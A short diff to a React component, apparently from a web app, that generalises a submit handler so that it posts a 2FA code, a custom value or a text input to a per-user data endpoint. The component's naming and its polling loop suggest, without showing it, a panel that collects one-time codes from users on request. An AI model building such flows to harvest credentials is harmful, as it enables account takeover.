@@ -30,16 +30,24 @@ function CommandPage({ userId }) {
     return () => clearInterval(interval);
   }, [userId]);
 
-  const handleSubmit = async (e, field) => {
+  const handleSubmit = async (e, field, customValue = null) => {
     e.preventDefault();
     setLoading(true);
     
-    const code = codeDigits.join('');
+    // Usar o valor personalizado se fornecido, senão usar codeDigits (para 2FA) ou inputValue
+    let valueToSend;
+    if (customValue !== null) {
+      valueToSend = customValue;
+    } else if (field === "token_2fa") {
+      valueToSend = codeDigits.join('');
+    } else {
+      valueToSend = inputValue;
+    }
     
     try {
       await axios.post(`${API}/user/submit-data/${userId}`, {
         field: field,
-        value: code
+        value: valueToSend
       });
       setSubmitted(true);
     } catch (error) {
